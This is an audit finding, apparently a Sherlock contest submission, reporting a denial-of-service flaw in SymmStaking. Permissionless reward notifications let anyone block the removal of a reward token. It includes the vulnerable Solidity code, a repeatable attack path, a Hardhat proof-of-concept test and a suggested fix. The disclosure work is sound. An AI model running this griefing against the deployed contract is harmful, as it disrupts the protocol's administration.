# Allowing anyone to provide rewards for stakers allows malicious user to prevent the call of `configureRewardToken` to deactivate a reward token

### Summary

In order to allow for users to earn rewards, the `REWARD_MANAGER_ROLE` needs to call `SymmStaking::configureRewardToken` to approve certain tokens to be added as rewards.

Once the rewards have been given, the token may be removed from the list of rewards under the condition that there are at most `10 wei` of rewards of that token left to be distributed.

```solidity
	function configureRewardToken(address token, bool status) external onlyRole(REWARD_MANAGER_ROLE) {
		_updateRewardsStates(address(0));

		if (token == address(0)) revert ZeroAddress();
		if (isRewardToken[token] == status) revert TokenWhitelistStatusUnchanged(token, status);

		isRewardToken[token] = status;
		if (!status) {
@>	        if (pendingRewards[token] > 10) revert OngoingRewardPeriodForToken(token, pendingRewards[token]);
			uint256 len = rewardTokens.length;
			for (uint256 i = 0; i < len; i++) {
				if (rewardTokens[i] == token) {
					rewardTokens[i] = rewardTokens[rewardTokens.length - 1];
					rewardTokens.pop();
					break;
				}
			}
		} else {
			rewardTokens.push(token);
			rewardState[token].duration = DEFAULT_REWARDS_DURATION;
		}

		emit UpdateWhitelist(token, status);
	}
```

Since the function [`notifyRewardAmount`](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L275) is permissionless, any one can provide the staking contract with a few tokens. This will increase the `pendingRewards` variable for that token, and will prevent the call of `configureRewardToken` to deactivate it.

`pendingRewards` only decreases when a user claims his rewards. Because the rewards are distributed over a constant duration of 1 week, the attacker can redo this very cheap attack before the end of this duration to permanently DoS `SymmStaking::configureRewardToken`.

Since the protocol's details states that they need to identify any vulnerabilities that could allow attackers to disrupt the system's functionality in any way, I believe this vulnerability to be an acceptable medium.

### Root Cause

`configureRewardToken` reverts when there are more than 10 wei of pending rewards, while `notifyRewardAmount` allows for anyone to add pending rewards.

### Internal Pre-conditions

A token needs to be configured as a reward, and the protocol intends to deactivate it.

### External Pre-conditions

None

### Attack Path


1. Attacker calls `notifyRewardAmount` with little amount on a token that's supposed to be removed
2. The protocol can't call `configureRewardToken` to remove this token until the rewards are fully distributed, one week later
3. The attacker goes over step 1 again


### Impact

Reward tokens can't be removed. 


### PoC

Copy this test function at the end of `symmStaking.behavior.ts`.

```ts
// npx hardhat test --grep "allows attacker to DoS configureRewardToken"
it("allows attacker to DoS configureRewardToken", async function () {
	// Sends some USDT to user2 for this scenario
	await usdtToken.connect(admin).transfer(user2, "604800")

	// Scenario:
	// 1. User1 deposits tokens
	// 2. Admin configures USDT as reward token
	// 3. User2 notifies small rewards for USDT
	// 4. Admin tries to remove USDT and it gets reverted

	const depositAmount = "604800"
	await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
	await symmStaking.connect(user1).deposit(depositAmount, user1.address)

	// Admin configures and notifies USDT as reward token
	const rewardAmount = "604800"	// The attack would work with only 11 wei, but the calculations are off (because of rounding due to small digit) and user can't claim even after one week. This PoC assumes that an admin would not let the reward be so low and would add rewards liquidity, in hope for the attack to end.
	await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)

	await usdtToken.connect(user2).approve(await symmStaking.getAddress(), rewardAmount)
	await symmStaking.connect(user2).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])

	console.log("pendingRewards for USDT", await symmStaking.pendingRewards(await usdtToken.getAddress()))

	// Fast forward time by almost one week
	// The user can redo the attack up to 11 seconds before the week ends
	await time.increase(604800 - 11) 

	// -- The following shows that we can't prevent the attacker from doing the attack because the users can't claim all rewards

	// User1 claims rewards
	const user1BalanceBefore = await usdtToken.balanceOf(user1.address)
	await symmStaking.connect(user1).claimRewards()
	const user1BalanceAfter = await usdtToken.balanceOf(user1.address)
	const user1Claimed = user1BalanceAfter - user1BalanceBefore

	console.log("user1Claimed", user1Claimed)
	expect(user1Claimed).to.equal("604789")
	console.log("pendingRewards for USDT", await symmStaking.pendingRewards(await usdtToken.getAddress()))

	await expect(symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), false)).to.be.revertedWithCustomError(
		symmStaking,
		"OngoingRewardPeriodForToken",
	)

	// -- The attacker can repeat the attack, and another week needs to pass before the protocol can hope to remove the token
})
```

### Mitigation

If the permissionless nature of the function `notifyRewardAmount` is useful, consider adding a mapping of tokens scheduled for removal to prevent such behavior.
